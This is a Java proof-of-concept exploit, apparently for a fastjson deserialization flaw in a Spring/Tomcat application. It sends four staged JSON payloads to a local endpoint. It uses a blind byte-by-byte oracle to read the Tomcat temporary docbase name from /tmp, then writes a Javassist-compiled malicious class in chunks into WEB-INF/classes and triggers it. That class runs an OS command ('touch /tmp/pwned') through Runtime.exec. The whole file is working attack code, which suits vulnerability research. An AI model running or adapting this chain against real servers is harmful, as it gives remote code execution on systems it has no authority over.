import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.web.client.RestClientException;
import org.springframework.web.client.RestTemplate;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class POC {
    static String target = "http://localhost:8081/json";
    static String file = "file:///tmp";
    static String file2write = "/tmp/${tomcat_docbase}/WEB-INF/classes/com/chenzai/HackException.class";

    public static Object sendJson(String payload) {
        try {
            RestTemplate restTemplate = new RestTemplate();

            HttpHeaders httpHeaders = new HttpHeaders();
            httpHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);

            LinkedMultiValueMap<Object, Object> map = new LinkedMultiValueMap<>();
            map.add("json", payload);

            HttpEntity<LinkedMultiValueMap<Object, Object>> request = new HttpEntity<>(map, httpHeaders);

            return restTemplate.postForObject(target, request, String.class);
        } catch (RestClientException e) {
            return "null";
        }
    }


    public static void main(String[] args) throws IOException, CannotCompileException, NotFoundException, InterruptedException {
        // 1. add inputStream to fastjson cache
        String payload1 = new String(Files.readAllBytes(Paths.get("payloads/step1.json")));
        sendJson(payload1);

        // 2. read file name of tmp docbase
        String data = "";
        boolean flag = true;
        String payload2 = new String(Files.readAllBytes(Paths.get("payloads/step2.json")));
        payload2 = payload2.replace("${file}", file);
        String template = payload2;
        while (flag) {
            for (int i = 0; i < 256; i++) {
                String temp = data + (char) i;
                payload2 = template.replace("${data}", Arrays.toString(temp.getBytes(StandardCharsets.UTF_8)));
                String o = (String) sendJson(payload2);
                if (o.length() > 79) {
                    System.out.println(o);
                    data = temp;
                    i = 0;
                }
                if (i == 255) flag = false;
            }
        }
        System.out.println(data);

        String regex = "tomcat-docbase\\.[^\\n]+";
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(data);
        String docbase = "";
        if (matcher.find()) docbase = matcher.group();
        System.out.println("find docbase: " + docbase + "!!!");
        file2write = file2write.replace("${tomcat_docbase}",docbase);

        // 3. write evil class file to docbase
        String payload3 = new String(Files.readAllBytes(Paths.get("payloads/step3.json")));
        payload3 = payload3.replace("${file2write}",file2write);
        byte[] evilBytes = getEvilBytes("touch /tmp/pwned");
        String shellcode = bytesToHexString(evilBytes);
        payload3 = payload3.replace("${size}",Integer.toString(24));
        String payloadTemplate = payload3;
        for (int i = 0; i < shellcode.length(); ) {
            int end = Math.min(i + 20, shellcode.length());
            System.out.println(shellcode.substring(i,end));
            payload3 = payloadTemplate.replace("${shellcode}",shellcode.substring(i,end));
            sendJson(payload3);
            i+=20;
        }

        String payload4 = new String(Files.readAllBytes(Paths.get("payloads/step4.json")));
        sendJson(payload4);
        System.out.println("done!!!");
    }

    public static byte[] getEvilBytes(String cmd) throws CannotCompileException, IOException, NotFoundException {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.makeClass("com.chenzai.HackException");
        cc.setSuperclass(pool.get("java.lang.Exception"));
        String shellcode = "        try {\n" +
                "            Runtime.getRuntime().exec(\"" + cmd + "\");\n" +
                "        } catch (Exception e) {\n" +
                "            throw new RuntimeException(e);\n" +
                "        }";
        cc.makeClassInitializer().insertBefore(shellcode);
        cc.toClass();
        return cc.toBytecode();
    }

    public static String bytesToHexString(byte[] bytes) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : bytes) {
            hexString.append("\\x").append(String.format("%02x", b));
        }
        return hexString.toString();
    }
}
